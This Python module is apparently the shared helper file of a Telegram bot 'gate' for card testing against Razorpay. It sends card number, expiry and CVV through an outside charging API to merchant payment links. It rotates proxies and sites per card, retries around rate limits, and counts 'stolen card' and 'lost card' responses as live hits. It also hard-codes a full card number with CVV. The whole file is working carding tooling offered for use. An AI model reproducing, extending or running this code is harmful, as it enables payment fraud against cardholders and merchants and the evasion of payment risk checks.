"""
gates/razorpay/common.py

Shared helpers for the Razorpay gate.

* New API endpoint format:
    GET https://razor-rho.vercel.app/rz?cc=<cc|mm|yy|cvv>&url=<razorpay_link>&amount=1&proxy=<proxy>

  Sample response:
    {
      "Status": "DECLINED",
      "CC": "4031630575378715|10|2029|926",
      "Amount": "1₹",
      "Gate": "Razorpay",
      "Site": "https://razorpay.me/@acspub",
      "t.me": "@notfrr",
      "Response": "Payment declined",
      "Code": "payment_risk_check_failed"
    }

The helpers in this module deal with:

* Calling the API safely (timeouts, JSON extraction, errors).
* Classifying the response into Charged / Approved / Declined buckets.
* Detecting "International cards are not supported" so the caller can auto-remove the
  offending site from the global Razorpay pool.
* Picking a random proxy out of the owner / user proxy database.
* Common card-parsing utilities.
"""

from __future__ import annotations

import asyncio
import json
import logging
import random
import re
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

import aiohttp

from db import remove_razorpay_site
from proxy import get_user_proxies_from_db


logger = logging.getLogger(__name__)

# ===== CONSTANTS =====
RAZORPAY_API_BASE = "https://razor-rho.vercel.app/rz"
DEFAULT_TEST_CARD = "4031630575378715|10|2029|926"
DEFAULT_AMOUNT = "1"

# Statuses we surface to the caller
STATUS_CHARGED = "CHARGED"
STATUS_APPROVED = "APPROVED"
STATUS_DECLINED = "DECLINED"
STATUS_ERROR = "ERROR"

# Substrings (case-insensitive) that mean the card was charged
CHARGED_INDICATORS = (
    "transaction success",
    "transaction successful",
    "payment success",
    "payment successful",
    "payment completed",
)

# Substrings (case-insensitive) that mean the card was "approved" (live but not charged)
APPROVED_INDICATORS = (
    "insufficient account balance",
    "insufficient funds",
    "incorrect cvv",
    "incorrect cvc",
    "cvv provided is incorrect",
    "cvv is incorrect",
    "do not honor",
    "do_not_honor",
    "stolen card",
    "card_stolen",
    "lost card",
    "card_lost",
    "transaction not permitted",
    "exceeds withdrawal",
    "expired card",
    "issuer not available",
    "authentication required",
    "3d_authentication",
)

# Substrings (case-insensitive) that indicate a DECLINE even if status says APPROVED
DECLINED_INDICATORS = (
    "payment didn't go through",
    "payment did not go through",
    "temporary issue",
    "will be refunded",
    "refunded in",
    "debited amount will be",
    "ds_required",
    "ds required",
    "3ds_required",
    "risk check failed",
    "payment_risk",
    "risk_check",
    "bank refused",
    "card_declined",
    "card declined",
    "not processed",
    "unable to process",
)

# Substrings (case-insensitive) that should auto-remove a site from the pool
SITE_KILL_INDICATORS = (
    "international cards are not supported",
)

# Card pattern (cc|mm|yy|cvv with various separators)
CARD_PATTERN = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)


# =====================================================================
# CARD PARSING
# =====================================================================
def normalize_card(raw: str) -> Optional[str]:
    """Normalise a single card string to ``CC|MM|YY|CVV``.

    Returns ``None`` if no valid card was found.
    """
    if not raw:
        return None
    match = CARD_PATTERN.search(raw)
    if not match:
        return None
    cc, mm, yy, cvv = match.groups()
    mm = mm.zfill(2)
    if len(yy) == 4:
        yy = yy[2:]
    return f"{cc}|{mm}|{yy}|{cvv}"


def extract_cards_from_text(text: str) -> List[str]:
    """Extract all valid CC|MM|YY|CVV cards from a chunk of text.

    Scans the entire text with the global regex so multiple cards on the
    same line (e.g. ``/mrz card1 card2``) are all returned, then deduplicates
    preserving order.
    """
    if not text:
        return []
    cards: List[str] = []
    seen = set()
    for match in CARD_PATTERN.finditer(text):
        cc, mm, yy, cvv = match.groups()
        mm = mm.zfill(2)
        if len(yy) == 4:
            yy = yy[2:]
        card = f"{cc}|{mm}|{yy}|{cvv}"
        if card not in seen:
            seen.add(card)
            cards.append(card)
    return cards


# =====================================================================
# PROXIES
# =====================================================================
async def get_proxies_for_user(user_id: int) -> List[str]:
    """Fetch the user's proxy pool (may be empty)."""
    try:
        proxies = await get_user_proxies_from_db(user_id)
        return proxies or []
    except Exception as e:
        logger.warning(f"Failed to load proxies for {user_id}: {e}")
        return []


def format_proxy_for_api(proxy: str) -> str:
    """Strip the protocol part — the API expects ``user:pass@host:port`` (or ``host:port``)."""
    if not proxy:
        return ""
    if proxy.startswith("http://"):
        return proxy[7:]
    if proxy.startswith("https://"):
        return proxy[8:]
    return proxy


# =====================================================================
# API CALL
# =====================================================================
async def _safe_json(response_text: str) -> Optional[Dict[str, Any]]:
    """Best-effort JSON extractor."""
    if not response_text:
        return None
    try:
        return json.loads(response_text)
    except json.JSONDecodeError:
        pass
    start = response_text.find("{")
    end = response_text.rfind("}")
    if start == -1 or end == -1 or end < start:
        return None
    try:
        return json.loads(response_text[start : end + 1])
    except json.JSONDecodeError:
        return None


async def call_razorpay_api(
    card: str,
    site: str,
    proxy: str = "",
    amount: str = DEFAULT_AMOUNT,
    timeout: int = 35,
    session: Optional[aiohttp.ClientSession] = None,
) -> Dict[str, Any]:
    """Call the Razorpay charging API.

    Returns a dict that always has the keys: ``Status``, ``Response``, ``Code``,
    ``Gate``, ``Site``, ``CC``, ``Amount`` and ``raw`` (the parsed JSON or None).
    On low-level errors ``Status`` is ``"ERROR"``.
    """
    proxy_param = format_proxy_for_api(proxy or "")
    params = {
        "cc": card,
        "url": site,
        "proxy": proxy_param,
    }
    api_url = f"{RAZORPAY_API_BASE}?{urllib.parse.urlencode(params, safe='|@:%+/')}"

    fallback = {
        "Status": STATUS_ERROR,
        "CC": card,
        "Amount": f"{amount}₹",
        "Gate": "Razorpay",
        "Site": site,
        "t.me": "",
        "Response": "",
        "Code": "N/A",
        "raw": None,
    }

    own_session = False
    if session is None:
        timeout_obj = aiohttp.ClientTimeout(total=timeout)
        session = aiohttp.ClientSession(timeout=timeout_obj)
        own_session = True

    try:
        try:
            async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
                text = await resp.text()
        except asyncio.TimeoutError:
            fallback["Response"] = "Request timed out"
            fallback["Code"] = "TIMEOUT"
            return fallback
        except aiohttp.ClientError as e:
            fallback["Response"] = f"HTTP error: {e}"
            fallback["Code"] = "HTTP_ERROR"
            return fallback

        data = await _safe_json(text)
        if not data:
            fallback["Response"] = (text or "Invalid API response")[:300]
            fallback["Code"] = "INVALID_JSON"
            return fallback

        out = {
            "Status": str(data.get("Status", "UNKNOWN")).upper(),
            "CC": data.get("CC", card),
            "Amount": data.get("Amount", f"{amount}₹"),
            "Gate": data.get("Gate", "Razorpay"),
            "Site": data.get("Site", site),
            "t.me": data.get("t.me", ""),
            "Response": data.get("Response", ""),
            "Code": data.get("Code", "N/A"),
            "raw": data,
        }
        return out
    finally:
        if own_session:
            try:
                await session.close()
            except Exception:
                pass


# =====================================================================
# CLASSIFICATION
# =====================================================================
def classify_response(api_response: Dict[str, Any]) -> str:
    """Return one of CHARGED / APPROVED / DECLINED / ERROR."""
    status = (api_response.get("Status") or "").upper()
    response_text = (api_response.get("Response") or "").lower()

    if status == STATUS_ERROR:
        return STATUS_ERROR

    if status in {"CHARGED", "SUCCESS", "APPROVED_CHARGE"}:
        return STATUS_CHARGED

    if any(ind in response_text for ind in CHARGED_INDICATORS):
        return STATUS_CHARGED

    # Check for decline indicators BEFORE approve — some responses say
    # "Approved" in status but the response text is actually a decline.
    if any(ind in response_text for ind in DECLINED_INDICATORS):
        return STATUS_DECLINED

    if any(ind in response_text for ind in APPROVED_INDICATORS):
        return STATUS_APPROVED

    if status in {"APPROVED", "OTP_REQUIRED", "3DS"}:
        return STATUS_APPROVED

    return STATUS_DECLINED


def is_site_killed_by(api_response: Dict[str, Any]) -> bool:
    """Detect responses that mean the site itself is not usable (international cards)."""
    text = (api_response.get("Response") or "").lower()
    if not text:
        return False
    return any(ind in text for ind in SITE_KILL_INDICATORS)


async def auto_remove_site_if_dead(api_response: Dict[str, Any]) -> bool:
    """If the response indicates a dead/invalid site, drop it from the pool."""
    if not is_site_killed_by(api_response):
        return False
    site = api_response.get("Site")
    if not site:
        return False
    try:
        removed = await remove_razorpay_site(site)
        if removed:
            logger.info(f"Auto-removed dead Razorpay site: {site}")
        return removed
    except Exception as e:
        logger.warning(f"Failed to auto-remove site {site}: {e}")
        return False


def status_emoji(status: str) -> str:
    if status == STATUS_CHARGED:
        return "🟢"
    if status == STATUS_APPROVED:
        return "🔵"
    if status == STATUS_DECLINED:
        return "🔴"
    return "⚪"


# =====================================================================
# SITE / PROXY PICKING
# =====================================================================
def pick_random(items: List[str]) -> Optional[str]:
    if not items:
        return None
    return random.choice(items)


def pair_sites_with_proxies(
    cards: List[str], sites: List[str], proxies: List[str]
) -> List[Tuple[str, str, str]]:
    """For each card return a (card, site, proxy) tuple.

    A different site and proxy are chosen per card whenever possible.
    """
    pairs: List[Tuple[str, str, str]] = []
    site_pool = sites[:] if sites else []
    proxy_pool = proxies[:] if proxies else []

    for idx, card in enumerate(cards):
        if site_pool:
            site = site_pool[idx % len(site_pool)] if len(site_pool) >= len(cards) else random.choice(site_pool)
        else:
            site = ""
        if proxy_pool:
            proxy = proxy_pool[idx % len(proxy_pool)] if len(proxy_pool) >= len(cards) else random.choice(proxy_pool)
        else:
            proxy = ""
        pairs.append((card, site, proxy))
    return pairs


# =====================================================================
# RETRYABLE: order_id not found
# =====================================================================
MAX_ORDER_RETRIES = 2  # retry up to 2 times with different site/proxy


def is_order_id_not_found(api_response: Dict[str, Any]) -> bool:
    """Return True if the response indicates 'order_id not found'."""
    text = (api_response.get("Response") or "").lower()
    return "order_id not found" in text or "order id not found" in text


def is_retryable_error(api_response: Dict[str, Any]) -> bool:
    """Return True for transient errors that should silently retry with a
    different site/proxy: order_id not found, request timed out,
    server disconnected, 429 rate limits, 'not enough connections'."""
    text = (api_response.get("Response") or "").lower()
    code = (api_response.get("Code") or "").lower()
    if "order_id not found" in text or "order id not found" in text:
        return True
    if "request timed out" in text or "timed out" in text or "timeout" in text:
        return True
    if "server disconnected" in text or "disconnected without sending" in text:
        return True
    if "not enough connections" in text or "429" in text or "too many requests" in text:
        return True
    if "429" in code:
        return True
    return False
